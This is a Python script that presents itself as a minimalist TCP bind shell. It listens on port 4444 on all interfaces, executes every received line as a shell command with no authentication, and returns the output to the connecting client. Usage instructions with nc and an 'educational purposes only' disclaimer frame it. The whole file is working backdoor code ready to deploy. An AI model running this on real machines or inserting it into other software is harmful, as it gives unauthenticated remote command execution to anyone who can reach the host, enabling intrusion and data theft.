#!/usr/bin/env python3
"""
Bind Shell

A minimalist, single-threaded TCP bind shell server.
Listens on a specified port, accepts incoming connections, and executes 
received strings as system shell commands. Combines stdout and stderr, 
returning the complete output to the connected client. Includes a timeout 
mechanism to prevent the server from hanging on interactive commands.
You can adjust the `PORT` and `TIMEOUT` constants to change the listening port
and command timeout duration.
    
Usage:
    Start the server: python bind_shell.py
    Connect to the server: nc ip_address listening_port

Disclaimer: 
    This code is for educational purposes only. Use it at your own risk. 
"""

import socket
import subprocess

PORT = 4444
TIMEOUT = 10

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', PORT))
s.listen(1)

print(f"Bind shell listening on port {PORT} with timeout {TIMEOUT}s")

while True:
    conn, _ = s.accept()
    f = conn.makefile('r', encoding='utf-8', errors='ignore')
    
    for cmd in f:
        cmd = cmd.strip()
        if not cmd: 
            continue
        if cmd.lower() == 'exit': 
            break
        
        try:
            out = subprocess.run(cmd, shell=True, capture_output=True, timeout=TIMEOUT)
            conn.sendall(out.stdout + out.stderr)
        except subprocess.TimeoutExpired:
            conn.sendall(f"Error: Command timed out after {TIMEOUT}s\n".encode())
        except Exception as e:
            conn.sendall(f"Error: {str(e)}\n".encode())
            
    conn.close()
